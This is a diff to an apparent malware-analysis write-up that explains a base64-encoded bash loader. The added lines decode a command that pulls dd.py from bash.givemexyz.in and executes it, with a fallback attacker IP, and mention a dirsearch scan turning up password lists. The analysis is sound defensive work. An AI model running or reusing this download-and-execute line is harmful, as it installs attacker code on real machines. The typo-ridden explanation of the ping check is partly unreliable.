@@ -85,6 +85,7 @@ os.system('echo IyEvYmluL2Jhc2gKCmlmIFsgJChwaW5nIC1jIDEgYmFzaC5naXZlbWV4eXouaW4g
 ```
 The next line in the code uses the 'os.system' method to decode a base64 string and execute the results on the machine. 
 
+Below is the decoded bash script. 
 ```bash
 #!/bin/bash
 
@@ -114,3 +115,22 @@ then
 
 fi
 ```
+The first thing the bash script does is run the following command:
+`ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0'`. The command will ping 'bash.givemexyz[.]in'. The '|' operator tells the command that after the machine is done pinging the domain, to now use the grep command to look for the string "bytes of data". Once again the script uses the '|' oeprator to now use the wc -l comamnd. This will tell the machine to count the lines but only give one output per line.  In bash -gt means greator then. When running the command on my machine, it outputed the '1'. The -gt is saying that the output must be greator than one. 
+
+If the output is greator than one the code will the define a variable named url and give that variable the value of 'bash.givemexyz[.]in'. If the value is greator then one, it will define a variable named 'base'. The contents of 'base' is base64 as shown below. 
+```
+cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn
+``` 
+The value of base64 when decoded is 
+`python -c 'import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())'`
+
+If the result of the ping to bash.givemexyz.in is not greator than 0, than the code will define url with the IP of '209.141.40.190'. 
+The Figure below shows some information about the IP. 
+<img src="https://i.imgur.com/nKvnALf.png" alt="209.141.40.190">
+
+The figure below shows the results of the <a href="https://github.com/maurosoria/dirsearch">dirsearch results.</a>It shows the password & user list as well as a couple other binaries. 
+<img src="https://i.imgur.com/CTaCkih.png">
+
+
+
